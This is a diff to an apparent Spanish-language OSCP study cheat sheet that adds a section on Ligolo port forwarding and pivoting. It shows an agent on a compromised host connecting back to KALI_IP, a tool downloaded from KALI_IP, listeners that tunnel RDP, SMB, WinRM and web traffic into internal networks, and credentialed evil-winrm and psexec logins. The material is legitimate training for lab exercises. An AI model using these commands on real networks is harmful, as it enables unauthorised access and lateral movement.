@@ -26,7 +26,7 @@
         <a href="linux-privesc.html">Linux Privesc</a>
         <a href="file-transfer.html">File Transfer</a>
         <a href="checklist.html">Checklist</a>
-        <a href="pivoting.html">Pivoting</a>>
+        <a href="pivoting.html">Pivoting</a>
     </nav>
 
     <div class="container">
@@ -181,6 +181,131 @@ iwr http://KALI_IP/ligolo.exe -OutFile ligolo.exe
                 <pre><code>proxychains evil-winrm -i 10.10.10.30 -u user -p password
 proxychains impacket-psexec domain/user:password@10.10.10.30
 </code></pre>
+
+            </div>
+        </div>
+        <div class="section">
+            <div class="section-header">Port Forwarding (Ligolo)</div>
+            <div class="section-content">
+
+                <h3>Concept</h3>
+                <p>
+                    El <strong>port forwarding</strong> permite acceder a servicios internos desde Kali
+                    a través de una máquina comprometida.
+                </p>
+
+                <p>
+                    Básicamente: expones un puerto en tu Kali que redirige tráfico hacia la red interna.
+                </p>
+
+                <pre><code>Kali:PUERTO → Victim:PUERTO_INTERNO</code></pre>
+
+                <h3>Step 1 – Tener Ligolo activo</h3>
+
+                <p><strong>En Kali:</strong></p>
+                <pre><code>./proxy -selfcert</code></pre>
+
+                <p><strong>En víctima:</strong></p>
+                <pre><code>./agent -connect KALI_IP:11601 -ignore-cert</code></pre>
+
+                <p><strong>Iniciar sesión:</strong></p>
+                <pre><code>session 1
+start</code></pre>
+
+                <h3>Step 2 – Crear Port Forward</h3>
+
+                <pre><code>listener_add --addr 0.0.0.0:LOCAL_PORT --to TARGET_IP:TARGET_PORT</code></pre>
+
+                <ul>
+                    <li><strong>LOCAL_PORT:</strong> puerto en Kali</li>
+                    <li><strong>TARGET_IP:</strong> máquina interna</li>
+                    <li><strong>TARGET_PORT:</strong> servicio interno</li>
+                </ul>
+
+                <h3>Example 1 – RDP</h3>
+
+                <pre><code>listener_add --addr 0.0.0.0:13389 --to 127.0.0.1:3389</code></pre>
+
+                <p>Conectar:</p>
+
+                <pre><code>xfreerdp /v:127.0.0.1:13389 /u:user /p:password</code></pre>
+
+                <h3>Example 2 – Web interna</h3>
+
+                <p>Servicio solo accesible desde la víctima:</p>
+
+                <pre><code>127.0.0.1:8080</code></pre>
+
+                <p>Forward:</p>
+
+                <pre><code>listener_add --addr 0.0.0.0:18080 --to 127.0.0.1:8080</code></pre>
+
+                <p>Abrir en navegador:</p>
+
+                <pre><code>http://127.0.0.1:18080</code></pre>
+
+                <h3>Example 3 – Pivot a otra máquina (B)</h3>
+
+                <p>Desde Victim A puedes acceder a:</p>
+
+                <pre><code>10.10.20.5:80</code></pre>
+
+                <p>Forward:</p>
+
+                <pre><code>listener_add --addr 0.0.0.0:18080 --to 10.10.20.5:80</code></pre>
+
+                <p>Acceso desde Kali:</p>
+
+                <pre><code>curl http://127.0.0.1:18080</code></pre>
+
+                <h3>Example 4 – SMB</h3>
+
+                <pre><code>listener_add --addr 0.0.0.0:1445 --to 10.10.20.5:445</code></pre>
+
+                <pre><code>smbclient -L //127.0.0.1 -p 1445</code></pre>
+
+                <h3>Example 5 – WinRM</h3>
+
+                <pre><code>listener_add --addr 0.0.0.0:15985 --to 10.10.20.5:5985</code></pre>
+
+                <pre><code>evil-winrm -i 127.0.0.1 -P 15985 -u user -p password</code></pre>
+
+                <h3>Multi Pivot (A → B → C)</h3>
+
+                <p>Escenario:</p>
+
+                <pre><code>Kali → Victim A → Victim B → Victim C (10.10.30.5:80)</code></pre>
+
+                <p>Forward desde Kali:</p>
+
+                <pre><code>listener_add --addr 0.0.0.0:18080 --to 10.10.30.5:80</code></pre>
+
+                <p>Acceso:</p>
+
+                <pre><code>http://127.0.0.1:18080</code></pre>
+
+                <h3>Important Notes</h3>
+
+                <ul>
+                    <li>127.0.0.1 en <strong>--to</strong> es la víctima, no Kali</li>
+                    <li>Siempre te conectas a <strong>127.0.0.1:LOCAL_PORT</strong> desde Kali</li>
+                    <li>Funciona para RDP, SMB, HTTP, WinRM, etc.</li>
+                </ul>
+
+                <h3>Common Mistake</h3>
+
+                <pre><code>xfreerdp /v:10.10.20.5   ❌</code></pre>
+
+                <p>No tienes acceso directo.</p>
+
+                <pre><code>xfreerdp /v:127.0.0.1:13389   ✅</code></pre>
+
+                <h3>OSCP Tip</h3>
+
+                <p>
+                    Si un servicio solo está en <strong>localhost</strong> o en otra subred,
+                    usa port forwarding para traerlo a tu Kali.
+                </p>
 
             </div>
         </div>
